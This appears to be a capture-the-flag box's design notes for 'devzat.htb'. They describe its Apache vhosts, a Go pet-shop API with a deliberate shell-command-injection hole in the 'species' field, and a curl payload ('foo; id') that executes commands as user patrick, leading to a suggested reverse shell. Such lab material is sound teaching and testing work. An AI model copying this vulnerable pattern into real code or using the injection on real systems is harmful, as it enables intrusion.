# Apache2 vhost [devzat.htb]
Landing page (Templated HTML5) will not give you much. Just instructions on how to use the secure version of devzat: `ssh -l [username] devzat.htb -p 8000`. It will give you hints on how to progress the box (in form of a forged chat history) if you login as `patrick`, `catherine` or `admin`. If you are not logging in from `127.0.0.1` you will be forced to change your nick.

# Apache2 vhost [pets.devzat.htb]
pets.devzat.htb will have a go application - webservice (petshop executable - systemd service)
	- It has .git folder for source (git-dumper can recover source)
	- this app has /api/pets
	- you can do POST request
	- It is supposed to pull in *Characteristics* by using an insecure function

## Vulnerable function
User has control over field **species**. When using *cat* it will pull file called *cat* and same applies for the other species.

```go
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
```

The page is rendering as a form. So either you  can send it through a proxy like burp and tinker with the species field like:

```bash
{
	"name": "Something",
	"species": "foo; <cmd>"
}
```

Or you could use `curl` to leverage this vulnerablility like:

```bash
$ curl -X POST "http://localhost:5000/api/pet" -d '{"name":"Something","species":"foo; id"}' -H "'Content-Type': 'application/json'"
Pet was added successfully%   

$ curl "http://localhost:5000/api/pet" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1016  100  1016    0     0  1178k      0 --:--:-- --:--:-- --:--:--  992k
[
 [... snip ...]
  {
    "name": "Something",
    "species": "foo; id",
    "characteristics": "cat: foo: No such file or directory\nuid=1000(patrick) gid=1000(patrick) snip ...\n"
  }
]
```

Using a bash reverse shell or anything else (pythons on the box, too) will give you reverse shell as user **patrick**.

## Cleanup
The go app cleans up the pets (and potential payloads) in a 5 second ticker event. It will reload to the few prestaged animals. So this will surely prevent multiple players from seeing eahc others payloads.

## Autostart
**systemd service**
```bash
[Unit]
Description=My Pet Inventory
After=network.target

[Service]
Type=simple
User=patrick
Group=patrick
Restart=always
RestartSec=5s

WorkingDirectory=/home/patrick/pets
ExecStart=/home/patrick/pets/start.sh
SyslogIdentifier=petshop

[Install]
WantedBy=multi-user.target
```
**start.sh**
```bash
#!/bin/bash
until ./petshop; do
    echo "Server 'petshop' crashed with exit code $?.  Respawning.." >&2
    sleep 1
done
```

# Apache2 Config
```bash
root@devzat:~# cat /etc/apache2/sites-available/000-default.conf 
<VirtualHost *:80>
    AssignUserID www-data www-data
    ServerName devzat.htb
    ServerAlias devzat.htb
    ServerAdmin support@devzat.htb
    DocumentRoot /var/www/html

    # Rewrite IP to hostname
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^devzat.htb$
    RewriteRule /.* http://devzat.htb/ [R]

    # Logging
    LogFormat "%h %l %u %t \"%r\" %>s %b"
    ErrorLog /var/log/apache2/landing_error.log    
    CustomLog /var/log/apache2/landing.log combined
</VirtualHost>

<VirtualHost *:80>
    AssignUserID patrick patrick
    ServerName pets.devzat.htb
    ServerAlias pets.devzat.htb
    ServerAdmin support@pets.devzat.htb

    # Reverse Proxy to petshop api
    ProxyPreserveHost On
    ProxyPass / http://127.0.0.1:5000/
    ProxyPassReverse / http://pets.devzat.htb:80/

    # Logging
    LogFormat "%h %l %u %t \"%r\" %>s %b"
    ErrorLog /var/log/apache2/petshop_error.log    
    CustomLog /var/log/apache2/petshop.log combined
</Virtualhost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
